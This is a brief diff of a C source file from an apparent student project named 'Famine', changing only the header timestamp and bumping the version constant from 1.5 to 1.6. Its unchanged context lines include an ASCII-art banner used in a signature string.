@@ -6,7 +6,7 @@
 /*   By: mgama <mgama@student.42lyon.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2024/07/25 15:44:10 by mgama             #+#    #+#             */
-/*   Updated: 2024/07/26 19:28:26 by mgama            ###   ########.fr       */
+/*   Updated: 2024/07/26 19:43:10 by mgama            ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -31,7 +31,7 @@
 #include "become_daemon.h"
 #include "ft_getopt.h"
 
-#define FM_VERSION		"1.5"
+#define FM_VERSION		"1.6"
 #define FM_AUTHOR		"mbrement and mgama"
 #define FM_HEADER		"\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0              .\n           ,'/ \\`.\n          |\\/___\\/|\n          \\'\\   /`/\n           `.\\ /,'\n              |\n              |\n             |=|\n        /\\  ,|=|.  /\\\n    ,'`.  \\/ |=| \\/  ,'`.\n  ,'    `.|\\ `-' /|,'    `.\n,'   .-._ \\ `---' / _,-.   `.\n   ,'    `-`-._,-'-'    `.\n  '                       `\n"
 #define FM_SIGNATURE	FM_HEADER"Famine "FM_VERSION" by "FM_AUTHOR
